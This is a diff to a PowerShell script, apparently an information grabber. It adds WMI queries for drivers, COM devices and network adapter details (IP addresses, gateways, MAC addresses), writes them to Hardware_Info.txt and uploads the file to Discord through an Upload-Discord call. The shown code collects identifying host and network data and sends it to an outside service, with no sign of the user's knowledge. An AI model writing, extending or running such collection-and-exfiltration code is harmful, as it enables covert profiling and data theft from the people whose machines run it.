@@ -359,6 +359,15 @@ function HardwareInfo {
     # Get video card information
     $videoCard = Get-WmiObject Win32_VideoController
 
+    # Get driver information
+    $drivers = Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, FriendlyName, DriverProviderName, DriverVersion
+
+    # Get COM devices information
+    $comDevices = Get-WmiObject Win32_PnPEntity | Where-Object { $_.Name -like '*COM*' } | Select-Object Name, DeviceID, Manufacturer
+
+    # Get network adapters information
+    $networkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -ne $null } | Select-Object Index, Description, IPAddress, DefaultIPGateway, MACAddress
+
     # Create the output content
     $output = @"
 ------------------------------------------------------------------------------------------------------------------------------
@@ -442,6 +451,26 @@ Name                 VideoProcessor                 DriverVersion CurrentHorizon
 ----                 --------------                 ------------- --------------------------- -------------------------
 $($videoCard.Name) $($videoCard.VideoProcessor) $($videoCard.DriverVersion) $($videoCard.CurrentHorizontalResolution) $($videoCard.CurrentVerticalResolution)
 
+------------------------------------------------------------------------------------------------------------------------------
+
+Drivers: 
+
+$($drivers | Format-Table | Out-String)
+
+
+------------------------------------------------------------------------------------------------------------------------------
+
+COM Devices:
+
+$($comDevices | Format-Table | Out-String)
+
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Network Adapters:
+
+$($networkAdapters | Format-Table | Out-String)
+
 "@
 
     # Save the output to Hardware_Info.txt
@@ -451,9 +480,8 @@ $($videoCard.Name) $($videoCard.VideoProcessor) $($videoCard.DriverVersion) $($v
     # Display the output path
     $HardwareInfoPath
 
-    # Upload Storage_Info.txt to Discord
+    # Upload Hardware_Info.txt to Discord
     Upload-Discord -file $HardwareInfoPath -text "Hardware Informations :"
-    
 }
 
 
